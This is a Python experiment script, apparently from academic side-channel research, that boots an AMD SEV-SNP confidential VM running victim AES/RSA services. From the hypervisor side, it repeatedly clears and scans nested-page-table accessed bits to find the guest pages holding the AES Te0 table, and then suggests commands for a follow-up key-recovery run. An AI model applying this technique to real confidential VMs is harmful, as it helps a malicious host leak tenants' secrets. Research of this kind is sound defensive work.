#!/usr/bin/env python3
from __future__ import annotations

import argparse
import csv
import json
import os
import re
import socket
import struct
import subprocess
import time
from pathlib import Path
from typing import Callable

from ch5_common import collect_host_facts, timestamped_outdir_ch5, write_json, write_lines
from experiment_common import (
    GUEST_KERNEL,
    INITRAMFS,
    OVMF_FD,
    QEMU_BIN,
    SRC_DIR,
    chown_to_sudo_user,
    ensure_artifacts,
    print_banner,
    require_root,
    stop_proc,
)


PAGE_SZ = 4096
PRIVATE_ALIAS_BASE = 1 << 32
KVM_AMD_NPT_ACCESS_F_FLUSH_TLB = 1 << 0
NPTCTL_MAGIC = 0x4E505443  # "NPTC"
NPTCTL_CMD_PING = 1
NPTCTL_CMD_GPA_TO_HPA = 2
NPTCTL_CMD_READ_GPA = 3
NPTCTL_CMD_NPT_CLEAR = 4
NPTCTL_CMD_NPT_SCAN = 5
FMT_NPTCTL_REQ = "<IHHQQQQ"
FMT_NPTCTL_RESP = "<IHHiiQQQQ"
NPTCTL_SCAN_MAX_ENTRIES = 1 << 20


class NptCtlClient:
    def __init__(self, sock_path: Path, timeout_s: float = 3.0) -> None:
        self.sock_path = Path(sock_path)
        self.timeout_s = timeout_s
        self.sock: socket.socket | None = None

    def connect(self) -> None:
        if self.sock is not None:
            return
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(self.timeout_s)
        s.connect(str(self.sock_path))
        self.sock = s

    def close(self) -> None:
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def _recv_exact(self, n: int) -> bytes:
        if self.sock is None:
            raise RuntimeError("nptctl not connected")
        out = b""
        while len(out) < n:
            chunk = self.sock.recv(n - len(out))
            if not chunk:
                raise RuntimeError("nptctl socket closed")
            out += chunk
        return out

    def _request(self, cmd: int, a: int = 0, b: int = 0, c: int = 0, d: int = 0) -> tuple[int, int, int, int, int, int, int, int]:
        if self.sock is None:
            raise RuntimeError("nptctl not connected")
        req = struct.pack(FMT_NPTCTL_REQ, NPTCTL_MAGIC, cmd, 0, a, b, c, d)
        self.sock.sendall(req)
        resp_raw = self._recv_exact(struct.calcsize(FMT_NPTCTL_RESP))
        magic, cmd_r, status, sys_errno, kret, v0, v1, v2, v3 = struct.unpack(FMT_NPTCTL_RESP, resp_raw)
        if magic != NPTCTL_MAGIC or cmd_r != cmd:
            raise RuntimeError(f"nptctl bad response: magic=0x{magic:x} cmd={cmd_r} expect={cmd}")
        if status != 0:
            raise OSError(sys_errno if sys_errno != 0 else 5, os.strerror(sys_errno if sys_errno != 0 else 5))
        return (kret, v0, v1, v2, v3, status, sys_errno, cmd_r)

    def ping(self) -> None:
        self._request(NPTCTL_CMD_PING)

    def npt_clear(self, gpa_start: int, gpa_end: int, flags: int) -> dict[str, int]:
        kret, v0, v1, _v2, _v3, _status, _errno, _cmd = self._request(
            NPTCTL_CMD_NPT_CLEAR, gpa_start, gpa_end, flags, 0
        )
        return {
            "gpa_start": int(gpa_start),
            "gpa_end": int(gpa_end),
            "flags": int(flags),
            "pages_scanned": int(v0),
            "pages_cleared": int(v1),
            "ret": int(kret),
        }

    def npt_scan(self, gpa_start: int, gpa_end: int, max_entries: int) -> dict[str, object]:
        kret, v0, v1, v2, _v3, _status, _errno, _cmd = self._request(
            NPTCTL_CMD_NPT_SCAN, gpa_start, gpa_end, max_entries, 0
        )
        entries_written = int(v0)
        pages_scanned = int(v1)
        pages_accessed = int(v2)
        raw = self._recv_exact(entries_written * 8) if entries_written > 0 else b""
        pages = list(struct.unpack(f"<{entries_written}Q", raw)) if entries_written > 0 else []
        return {
            "gpa_start": int(gpa_start),
            "gpa_end": int(gpa_end),
            "max_entries": int(max_entries),
            "entries_written": entries_written,
            "pages_scanned": pages_scanned,
            "pages_accessed": pages_accessed,
            "ret": int(kret),
            "pages": pages,
        }


def parse_u64(raw: str) -> int:
    s = raw.strip()
    if s.lower().startswith("0x"):
        return int(s, 16)
    return int(s, 10)


def parse_mem_to_bytes(raw: str) -> int:
    s = raw.strip().upper()
    m = re.fullmatch(r"([0-9]+)([KMG]?)", s)
    if not m:
        raise ValueError(f"invalid --mem value: {raw}")
    n = int(m.group(1))
    unit = m.group(2)
    if unit == "K":
        return n * 1024
    if unit == "M":
        return n * 1024 * 1024
    if unit == "G":
        return n * 1024 * 1024 * 1024
    return n


def default_scan_end_for_mem(mem_bytes: int) -> int:
    # For SNP private mappings we may observe a mirrored GPA window above 4GB
    # (e.g. te0_gpa around 0x101xxxxxx with mem=4G). By default, cover both.
    if mem_bytes <= PRIVATE_ALIAS_BASE:
        return PRIVATE_ALIAS_BASE + mem_bytes
    return mem_bytes


def recv_exact(sock: socket.socket, n: int) -> bytes:
    out = b""
    while len(out) < n:
        chunk = sock.recv(n - len(out))
        if not chunk:
            break
        out += chunk
    return out


def aes_request(host: str, port: int, plaintext: bytes, timeout_s: float) -> bytes:
    if len(plaintext) != 16:
        raise ValueError("plaintext must be 16 bytes")
    with socket.create_connection((host, port), timeout=timeout_s) as s:
        s.sendall(plaintext)
        out = recv_exact(s, 16)
    if len(out) != 16:
        raise RuntimeError(f"AES service short response: {len(out)} bytes")
    return out


def wait_tcp_ready(host: str, port: int, timeout_s: int) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1.0):
                return True
        except OSError:
            time.sleep(0.5)
    return False


def wait_vm_ready(host: str, aes_port: int, timeout_s: int) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            _ = aes_request(host, aes_port, b"\x00" * 16, timeout_s=1.5)
            return True
        except Exception:
            pass
        time.sleep(1.0)
    return False


def resolve_path_with_fallback(default_path: Path, fallback_path: Path) -> Path:
    if default_path.exists():
        return default_path
    if fallback_path.exists():
        return fallback_path
    return default_path


def make_affinity_preexec(cpu: int) -> Callable[[], None] | None:
    if cpu < 0:
        return None

    def _fn() -> None:
        os.sched_setaffinity(0, {cpu})

    return _fn


def qemu_netdev_backends(qemu_bin: Path) -> set[str]:
    cp = subprocess.run(
        [str(qemu_bin), "-netdev", "help"],
        capture_output=True,
        text=True,
        check=False,
    )
    out = (cp.stdout or "") + "\n" + (cp.stderr or "")
    backs: set[str] = set()
    for line in out.splitlines():
        s = line.strip()
        if not s or s.endswith(":"):
            continue
        if " " in s or "\t" in s:
            continue
        backs.add(s)
    return backs


def create_tap_interface(ifname: str, host_ip: str) -> None:
    cmds = [
        ["ip", "tuntap", "add", "dev", ifname, "mode", "tap"],
        ["ip", "addr", "add", f"{host_ip}/24", "dev", ifname],
        ["ip", "link", "set", ifname, "up"],
    ]
    for cmd in cmds:
        cp = subprocess.run(cmd, capture_output=True, text=True, check=False)
        if cp.returncode != 0:
            raise RuntimeError(f"tap setup failed: {' '.join(cmd)}: {cp.stderr.strip()}")


def remove_tap_interface(ifname: str) -> None:
    subprocess.run(["ip", "link", "set", ifname, "down"], check=False)
    subprocess.run(["ip", "tuntap", "del", "dev", ifname, "mode", "tap"], check=False)


def resolve_te0_symbol_bin(user_path: str) -> Path:
    candidates: list[Path] = []
    if user_path.strip():
        candidates.append(Path(user_path).expanduser())
    candidates.extend(
        [
            SRC_DIR / "build" / "guest_victim_aes",
            SRC_DIR / "build" / "openssl_noasm" / "libcrypto.a",
            Path("/opt/openssl-noasm/lib/libcrypto.so"),
        ]
    )
    seen: set[str] = set()
    uniq: list[Path] = []
    for p in candidates:
        k = str(p.resolve() if p.is_absolute() else p)
        if k in seen:
            continue
        seen.add(k)
        uniq.append(p)
    for p in uniq:
        if p.exists():
            return p
    tried = "\n".join(f"  - {p}" for p in uniq)
    raise SystemExit("[seed] te0 symbol binary not found; tried:\n" + tried)


def wait_nptctl_ready(sock_path: Path, timeout_s: int) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        if sock_path.exists():
            cli = NptCtlClient(sock_path=sock_path, timeout_s=1.5)
            try:
                cli.connect()
                cli.ping()
                cli.close()
                return True
            except Exception:
                cli.close()
        time.sleep(0.3)
    return False


def parse_te0_symbol_vma(symbol_bin: Path) -> int:
    cp = subprocess.run(["nm", "-A", str(symbol_bin)], capture_output=True, text=True, check=False)
    if cp.returncode != 0:
        raise RuntimeError(f"nm failed on {symbol_bin}: {cp.stderr.strip()}")
    m = re.search(r":([0-9a-fA-F]+)\s+[A-Za-z]\s+Te0$", cp.stdout, flags=re.M)
    if not m:
        raise RuntimeError(f"cannot find symbol Te0 in {symbol_bin}")
    return int(m.group(1), 16)


def parse_load_segments(symbol_bin: Path) -> list[tuple[int, int, int]]:
    cp = subprocess.run(["readelf", "-W", "-l", str(symbol_bin)], capture_output=True, text=True, check=False)
    if cp.returncode != 0:
        return []
    segs: list[tuple[int, int, int]] = []
    pat = re.compile(r"^\s*LOAD\s+0x([0-9a-fA-F]+)\s+0x([0-9a-fA-F]+)\s+0x[0-9a-fA-F]+\s+0x([0-9a-fA-F]+)")
    for line in cp.stdout.splitlines():
        m = pat.match(line)
        if not m:
            continue
        off = int(m.group(1), 16)
        vaddr = int(m.group(2), 16)
        memsz = int(m.group(3), 16)
        segs.append((off, vaddr, memsz))
    return segs


def compute_te0_offset(symbol_bin: Path) -> dict[str, int]:
    te0_vma = parse_te0_symbol_vma(symbol_bin)
    segs = parse_load_segments(symbol_bin)
    te0_file_off = te0_vma
    for off, vaddr, memsz in segs:
        if vaddr <= te0_vma < (vaddr + memsz):
            te0_file_off = off + (te0_vma - vaddr)
            break
    return {
        "te0_vma": te0_vma,
        "te0_file_offset": te0_file_off,
        "te0_inpage_offset": te0_file_off & (PAGE_SZ - 1),
    }


def launch_reference_vm(
    args: argparse.Namespace, vm_dir: Path
) -> tuple[subprocess.Popen, str, str, Callable[[], None] | None, Path]:
    qemu_bin = resolve_path_with_fallback(
        QEMU_BIN, Path("<COHERE_REPO>/AMDSEV/qemu/build/qemu-system-x86_64")
    )
    ovmf_fd = resolve_path_with_fallback(
        OVMF_FD, Path("<COHERE_REPO>/AMDSEV/ovmf/Build/OvmfX64/DEBUG_GCC5/FV/OVMF.fd")
    )
    if not qemu_bin.exists():
        raise SystemExit(f"[env] QEMU binary not found: {qemu_bin}")
    if not ovmf_fd.exists():
        raise SystemExit(f"[env] OVMF not found: {ovmf_fd}")
    if not GUEST_KERNEL.exists():
        raise SystemExit(f"[env] guest kernel missing: {GUEST_KERNEL}")
    if not INITRAMFS.exists():
        raise SystemExit(f"[env] initramfs missing: {INITRAMFS}")

    base_parts = [
        "console=ttyS0",
        "rdinit=/init",
        "panic=-1",
        "quiet",
        "probe_mode=victim_services",
    ]
    extra_cmdline = str(getattr(args, "guest_extra_cmdline", "")).strip()
    if extra_cmdline:
        base_parts.append(extra_cmdline)
    append_base = " ".join(base_parts)
    netdevs = qemu_netdev_backends(qemu_bin)
    net_mode = args.net_mode
    if net_mode == "auto":
        net_mode = "user" if "user" in netdevs else "tap"

    net_args: list[str]
    runtime_host = args.host
    cleanup: Callable[[], None] | None = None
    if net_mode == "user":
        if "user" not in netdevs:
            raise SystemExit(
                f"[seed] qemu has no user net backend. available={sorted(netdevs)}; "
                "use --net-mode tap or rebuild qemu with slirp."
            )
        append = append_base + " ip=10.0.2.15::10.0.2.2:255.255.255.0::eth0:off"
        net_args = [
            "-netdev",
            f"user,id=net0,hostfwd=tcp::{args.aes_port}-:9000,hostfwd=tcp::{args.rsa_port}-:9001",
            "-device",
            "virtio-net-pci,netdev=net0",
        ]
    elif net_mode == "tap":
        if "tap" not in netdevs:
            raise SystemExit(
                f"[seed] qemu has no tap net backend. available={sorted(netdevs)}."
            )
        tap_if = args.tap_ifname.strip() if args.tap_ifname.strip() else f"tap53s{os.getpid() % 10000}"
        create_tap_interface(tap_if, args.tap_host_ip)
        cleanup = lambda: remove_tap_interface(tap_if)
        append = append_base + f" ip={args.tap_guest_ip}::{args.tap_host_ip}:255.255.255.0::eth0:off"
        net_args = [
            "-netdev",
            f"tap,id=net0,ifname={tap_if},script=no,downscript=no",
            "-device",
            "virtio-net-pci,netdev=net0",
        ]
        runtime_host = args.tap_guest_ip if args.host == "127.0.0.1" else args.host
    else:
        raise SystemExit(f"[seed] invalid --net-mode: {args.net_mode}")

    npt_sock = vm_dir / "nptctl.sock"
    preload_env = os.environ.copy()
    preload_env.update(
        {
            "HR_MODE": "nptctl",
            "HR_OUTDIR": str(vm_dir),
            "HR_NPT_SOCK": str(npt_sock),
            "HR_CPU": str(args.qemu_cpu),
            "LD_PRELOAD": str(SRC_DIR / "build" / "libhost_runner.so"),
        }
    )
    (vm_dir / ".hr_preload.lock").unlink(missing_ok=True)

    qemu_cmd = [
        str(qemu_bin),
        "-enable-kvm",
        "-cpu",
        args.cpu_model,
        "-machine",
        "q35,smm=off",
        "-machine",
        "confidential-guest-support=sev0,vmport=off",
        "-machine",
        "memory-backend=ram1",
        "-smp",
        str(args.smp),
        "-m",
        str(args.mem),
        "-no-reboot",
        "-object",
        f"memory-backend-memfd,id=ram1,size={args.mem},share=true,prealloc=false",
        "-object",
        "sev-snp-guest,id=sev0,policy=0x30000,cbitpos=51,reduced-phys-bits=1",
        "-bios",
        str(ovmf_fd),
        "-kernel",
        str(GUEST_KERNEL),
        "-initrd",
        str(INITRAMFS),
        "-append",
        append,
        "-serial",
        f"file:{vm_dir / 'qemu_console.log'}",
        *net_args,
        "-nographic",
    ]
    print(f"[seed] qemu_bin={qemu_bin}")
    print(f"[seed] ovmf_fd={ovmf_fd}")
    print(f"[seed] qemu_mem={args.mem}")
    print(f"[seed] net_mode={net_mode} host_for_trigger={runtime_host}")
    print(f"[seed] cmd={' '.join(qemu_cmd)}")

    qlog = (vm_dir / "qemu.log").open("w")
    proc = subprocess.Popen(
        qemu_cmd,
        cwd=str(SRC_DIR),
        env=preload_env,
        stdin=subprocess.DEVNULL,
        stdout=qlog,
        stderr=subprocess.STDOUT,
        preexec_fn=make_affinity_preexec(args.qemu_cpu),
        start_new_session=True,
    )
    return proc, runtime_host, net_mode, cleanup, npt_sock


def npt_discovery(
    npt: NptCtlClient,
    args: argparse.Namespace,
    scan_start_gpa: int,
    scan_end_gpa: int,
    outdir: Path,
) -> list[dict[str, int]]:
    disc_dir = outdir / "npt_seed"
    disc_dir.mkdir(parents=True, exist_ok=True)
    rounds_csv = disc_dir / "seed_rounds.csv"

    pages_per_range = max(1, (scan_end_gpa - scan_start_gpa) // PAGE_SZ)
    max_entries = max(512, min(NPTCTL_SCAN_MAX_ENTRIES, pages_per_range))
    trig_hits: dict[int, int] = {}
    base_hits: dict[int, int] = {}

    with rounds_csv.open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(
            [
                "round",
                "baseline_pages",
                "trigger_pages",
                "new_pages_after_trigger",
                "clear_pages_scanned",
                "clear_pages_cleared",
            ]
        )

        for r in range(args.discover_rounds):
            clear1 = npt.npt_clear(
                scan_start_gpa,
                scan_end_gpa,
                KVM_AMD_NPT_ACCESS_F_FLUSH_TLB,
            )
            if clear1["ret"] != 0:
                raise RuntimeError(f"NPT clear failed(ret={clear1['ret']}) round={r}")

            time.sleep(args.baseline_wait_ms / 1000.0)
            base = npt.npt_scan(scan_start_gpa, scan_end_gpa, max_entries=max_entries)
            if base["ret"] != 0:
                raise RuntimeError(f"NPT baseline scan failed(ret={base['ret']}) round={r}")
            base_pages = set((int(p) & ~(PAGE_SZ - 1)) for p in base["pages"])

            clear2 = npt.npt_clear(
                scan_start_gpa,
                scan_end_gpa,
                KVM_AMD_NPT_ACCESS_F_FLUSH_TLB,
            )
            if clear2["ret"] != 0:
                raise RuntimeError(f"NPT clear before trigger failed(ret={clear2['ret']}) round={r}")

            for _ in range(args.trigger_requests_per_round):
                _ = aes_request(args.host, args.aes_port, os.urandom(16), timeout_s=args.sock_timeout_s)

            trig = npt.npt_scan(scan_start_gpa, scan_end_gpa, max_entries=max_entries)
            if trig["ret"] != 0:
                raise RuntimeError(f"NPT trigger scan failed(ret={trig['ret']}) round={r}")
            trig_pages = set((int(p) & ~(PAGE_SZ - 1)) for p in trig["pages"])

            for p in base_pages:
                base_hits[p] = base_hits.get(p, 0) + 1
            for p in trig_pages:
                trig_hits[p] = trig_hits.get(p, 0) + 1

            wr.writerow(
                [
                    r,
                    len(base_pages),
                    len(trig_pages),
                    len(trig_pages - base_pages),
                    clear2["pages_scanned"],
                    clear2["pages_cleared"],
                ]
            )

    ranking: list[dict[str, int]] = []
    all_pages = sorted(set(trig_hits.keys()) | set(base_hits.keys()))
    for p in all_pages:
        t = trig_hits.get(p, 0)
        b = base_hits.get(p, 0)
        ranking.append(
            {
                "page_gpa": p,
                "trigger_hits": t,
                "baseline_hits": b,
                "score": t - b,
            }
        )
    ranking.sort(key=lambda it: (it["score"], it["trigger_hits"], -it["baseline_hits"]), reverse=True)

    with (disc_dir / "seed_page_ranking.csv").open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(["rank", "page_gpa", "score", "trigger_hits", "baseline_hits"])
        for i, row in enumerate(ranking, start=1):
            wr.writerow([i, f"0x{row['page_gpa']:x}", row["score"], row["trigger_hits"], row["baseline_hits"]])

    write_json(
        disc_dir / "seed_page_ranking.json",
        {
            "scan_start_gpa": f"0x{scan_start_gpa:x}",
            "scan_end_gpa": f"0x{scan_end_gpa:x}",
            "ranking": ranking,
        },
    )
    return ranking


def select_cluster_pages(ranking: list[dict[str, int]], args: argparse.Namespace) -> list[int]:
    if not ranking:
        raise RuntimeError("empty NPT ranking result")

    pos = [
        row
        for row in ranking
        if int(row["score"]) >= args.min_score and int(row["trigger_hits"]) > int(row["baseline_hits"])
    ]
    if not pos:
        pos = [row for row in ranking if int(row["score"]) > 0]
    if not pos:
        pos = ranking[: max(1, args.top_pages)]

    pos = pos[: max(1, args.top_pages)]
    page_score = {int(r["page_gpa"]): int(r["score"]) for r in pos}
    pages = sorted(page_score.keys())
    if not pages:
        raise RuntimeError("no candidate pages after filtering")

    gap_bytes = max(0, args.cluster_gap_pages) * PAGE_SZ
    clusters: list[list[int]] = []
    cur: list[int] = [pages[0]]
    for p in pages[1:]:
        if p - cur[-1] <= max(PAGE_SZ, gap_bytes):
            cur.append(p)
        else:
            clusters.append(cur)
            cur = [p]
    clusters.append(cur)

    def score_of(cluster: list[int]) -> tuple[int, int, int]:
        s = sum(max(0, page_score.get(p, 0)) for p in cluster)
        count = len(cluster)
        span = cluster[-1] - cluster[0]
        return (s, count, -span)

    best = max(clusters, key=score_of)
    return best


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(
        description="Derive 5.3 suspected GPA range from reference VM using only AES/RSA service interfaces."
    )
    ap.add_argument("--outdir", default="")
    ap.add_argument("--skip-build", action="store_true")

    ap.add_argument("--cpu-model", default="host,pmu=on")
    ap.add_argument(
        "--guest-extra-cmdline",
        default="nokaslr norandmaps",
        help="Extra kernel cmdline passed to guest via QEMU -append",
    )
    ap.add_argument("--qemu-cpu", type=int, default=32)
    ap.add_argument("--smp", default="1")
    ap.add_argument("--mem", default="4G")

    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--aes-port", type=int, default=9000)
    ap.add_argument("--rsa-port", type=int, default=9001)
    ap.add_argument("--sock-timeout-s", type=float, default=3.0)
    ap.add_argument("--vm-ready-timeout-s", type=int, default=180)
    ap.add_argument("--net-mode", choices=["auto", "user", "tap"], default="auto")
    ap.add_argument("--tap-ifname", default="")
    ap.add_argument("--tap-host-ip", default="192.168.76.1")
    ap.add_argument("--tap-guest-ip", default="192.168.76.2")

    ap.add_argument("--scan-start-gpa", default="0x0")
    ap.add_argument("--scan-end-gpa", default="")
    ap.add_argument("--discover-rounds", type=int, default=12)
    ap.add_argument("--trigger-requests-per-round", type=int, default=16)
    ap.add_argument("--baseline-wait-ms", type=int, default=5)

    ap.add_argument("--top-pages", type=int, default=256)
    ap.add_argument("--min-score", type=int, default=2)
    ap.add_argument("--cluster-gap-pages", type=int, default=2)
    ap.add_argument("--pad-pages", type=int, default=2)

    ap.add_argument(
        "--te0-symbol-bin",
        default="",
        help=(
            "Optional symbol source for Te0 offset. "
            "If omitted, auto-detect from local VM artifact "
            "(src/build/guest_victim_aes), then fallback candidates."
        ),
    )
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    require_root("[!] run_53_seed_range.py requires root. Use: sudo -E python3 src/scripts/run_53_seed_range.py")

    outdir = Path(args.outdir).resolve() if args.outdir else timestamped_outdir_ch5("exp5_3_seed")
    outdir.mkdir(parents=True, exist_ok=True)
    print_banner("Experiment 5.3 seed: suspected GPA range (service-only)", outdir)

    ensure_artifacts(args.skip_build, outdir / "build_stage")
    collect_host_facts(outdir)

    symbol_bin = resolve_te0_symbol_bin(args.te0_symbol_bin)
    print(f"[seed] te0_symbol_bin={symbol_bin}")
    te0 = compute_te0_offset(symbol_bin)

    scan_start = parse_u64(args.scan_start_gpa) & ~(PAGE_SZ - 1)
    if args.scan_end_gpa:
        scan_end = parse_u64(args.scan_end_gpa)
    else:
        scan_end = default_scan_end_for_mem(parse_mem_to_bytes(args.mem))
    scan_end = (scan_end + (PAGE_SZ - 1)) & ~(PAGE_SZ - 1)
    if scan_end <= scan_start:
        raise SystemExit(f"[seed] invalid scan range: start=0x{scan_start:x}, end=0x{scan_end:x}")

    vm_dir = outdir / "vm_seed"
    vm_dir.mkdir(parents=True, exist_ok=True)
    proc, runtime_host, net_mode, net_cleanup, npt_sock = launch_reference_vm(args, vm_dir)
    args.host = runtime_host
    npt: NptCtlClient | None = None
    try:
        ready = wait_vm_ready(runtime_host, args.aes_port, args.vm_ready_timeout_s)
        if not ready:
            raise SystemExit(f"[seed] victim services not ready; see {vm_dir / 'qemu.log'}")
        if not wait_nptctl_ready(npt_sock, args.vm_ready_timeout_s):
            raise SystemExit(f"[seed] nptctl preload not ready; see {vm_dir / 'qemu.log'}")

        npt = NptCtlClient(sock_path=npt_sock, timeout_s=args.sock_timeout_s)
        npt.connect()
        ranking = npt_discovery(npt, args, scan_start, scan_end, outdir)
        cluster_pages = select_cluster_pages(ranking, args)

        pad = max(0, args.pad_pages) * PAGE_SZ
        cluster_start = min(cluster_pages)
        cluster_end = max(cluster_pages) + PAGE_SZ
        suspected_start = max(0, cluster_start - pad) & ~(PAGE_SZ - 1)
        suspected_end = (cluster_end + pad + (PAGE_SZ - 1)) & ~(PAGE_SZ - 1)

        result = {
            "method": "service_only_npt_accessed_differential",
            "te0_symbol_bin": str(symbol_bin),
            "te0_symbol_vma": f"0x{te0['te0_vma']:x}",
            "te0_file_offset": f"0x{te0['te0_file_offset']:x}",
            "te0_inpage_offset": f"0x{te0['te0_inpage_offset']:x}",
            "seed_scan_start_gpa": f"0x{scan_start:x}",
            "seed_scan_end_gpa": f"0x{scan_end:x}",
            "net_mode": net_mode,
            "trigger_host": runtime_host,
            "guest_cmdline_extra": str(args.guest_extra_cmdline),
            "discover_rounds": int(args.discover_rounds),
            "trigger_requests_per_round": int(args.trigger_requests_per_round),
            "cluster_pages": [f"0x{p:x}" for p in cluster_pages],
            "cluster_start_gpa": f"0x{cluster_start:x}",
            "cluster_end_gpa_exclusive": f"0x{cluster_end:x}",
            "pad_pages": int(args.pad_pages),
            "suspected_scan_start_gpa": f"0x{suspected_start:x}",
            "suspected_scan_end_gpa": f"0x{suspected_end:x}",
            "suggested_discovery_cmd": (
                "sudo -E python3 src/scripts/run_53.py "
                f"--suspected-range-json {outdir / 'suspected_gpa_range_53.json'} "
                "--discover-only"
            ),
            "suggested_full_cmd": (
                "sudo -E python3 src/scripts/run_53.py "
                f"--suspected-range-json {outdir / 'suspected_gpa_range_53.json'} "
                "--line-reps 32 --samples 20000 "
                "--checkpoints 1000,2000,5000,10000,20000"
            ),
        }
        write_json(outdir / "suspected_gpa_range_53.json", result)
        write_lines(
            outdir / "stats_seed_53.txt",
            [
                "=== 5.3 Seed GPA Range (service-only) ===",
                f"te0_symbol_bin={symbol_bin}",
                f"te0_symbol_vma=0x{te0['te0_vma']:x}",
                f"te0_file_offset=0x{te0['te0_file_offset']:x}",
                f"te0_inpage_offset=0x{te0['te0_inpage_offset']:x}",
                f"seed_scan_start_gpa=0x{scan_start:x}",
                f"seed_scan_end_gpa=0x{scan_end:x}",
                f"net_mode={net_mode}",
                f"trigger_host={runtime_host}",
                f"guest_cmdline_extra={args.guest_extra_cmdline}",
                f"cluster_pages={','.join(f'0x{p:x}' for p in cluster_pages)}",
                f"suspected_scan_start_gpa=0x{suspected_start:x}",
                f"suspected_scan_end_gpa=0x{suspected_end:x}",
                f"pad_pages={args.pad_pages}",
                result["suggested_discovery_cmd"],
                result["suggested_full_cmd"],
            ],
        )
        print("\n=== seed range done ===")
        print(f"data dir: {outdir}")
        print(result["suggested_discovery_cmd"])
        print(result["suggested_full_cmd"])
    finally:
        if npt is not None:
            npt.close()
        stop_proc(proc, timeout_s=5.0)
        if net_cleanup is not None:
            net_cleanup()
        chown_to_sudo_user(outdir)


if __name__ == "__main__":
    main()
